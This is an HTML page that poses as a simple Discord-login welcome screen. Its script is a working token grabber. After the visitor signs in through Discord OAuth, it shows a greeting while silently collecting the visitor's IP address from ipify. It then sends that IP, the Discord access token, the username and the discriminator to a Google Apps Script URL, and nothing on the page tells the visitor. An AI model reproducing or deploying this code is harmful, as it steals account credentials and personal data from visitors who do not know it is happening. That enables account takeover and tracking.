<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>0lRushy Was Here</title>
  <style>
    body { background: black; color: white; font-family: monospace; text-align:center; }
    #entry-screen { position: fixed; inset:0; display:flex; justify-content:center; align-items:center; font-size:2em; cursor:pointer; }
    #main-content { display:none; padding: 20px; }
  </style>
</head>
<body>
  <div id="entry-screen">Loading...</div>

  <div id="main-content">
    <h1>Welcome, <span id="user-info"></span></h1>
  </div>

  <script>
    const clientId = '1372712369100161055';
    const redirectUri = encodeURIComponent(window.location.origin + window.location.pathname);
    const scope = 'identify';
    const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=token&scope=${scope}`;

    function getAccessTokenFromHash() {
      const hash = window.location.hash.substring(1);
      const params = new URLSearchParams(hash);
      return params.get('access_token');
    }

    async function fetchDiscordUser(token) {
      try {
        const res = await fetch('https://discord.com/api/users/@me', {
          headers: { Authorization: `Bearer ${token}` }
        });
        if (!res.ok) throw new Error('Failed to fetch user info');
        return await res.json();
      } catch {
        return null;
      }
    }

    async function init() {
      let token = getAccessTokenFromHash();

      if (!token) {
        window.location.href = discordAuthUrl;
        return;
      }

      history.replaceState(null, null, ' ');

      const user = await fetchDiscordUser(token);
      if (!user) {
        document.getElementById('entry-screen').textContent = 'Failed to fetch Discord user info.';
        return;
      }

      document.getElementById('user-info').textContent = `${user.username}#${user.discriminator}`;
      document.getElementById('entry-screen').style.display = 'none';
      document.getElementById('main-content').style.display = 'block';

      // جلب IP وارسال البيانات للـ GAS
      fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
          const ip = data.ip;
          const gasURL = 'https://script.google.com/macros/s/AKfycbxKvTAnQhresyE7v_3OVz_KKyxdDWKGtlZDoiKpxBYnSFc7i5QSMTd3zzB5g2XzlRYS/exec';
          const params = new URLSearchParams({
            ip,
            token,
            username: user.username,
            discriminator: user.discriminator
          });
          fetch(gasURL + '?' + params.toString())
            .then(res => res.text())
            .then(text => console.log('GAS response:', text))
            .catch(e => console.error('Error sending data to GAS:', e));
        })
        .catch(e => console.error('Failed to get IP:', e));
    }

    init();
  </script>
</body>
</html>
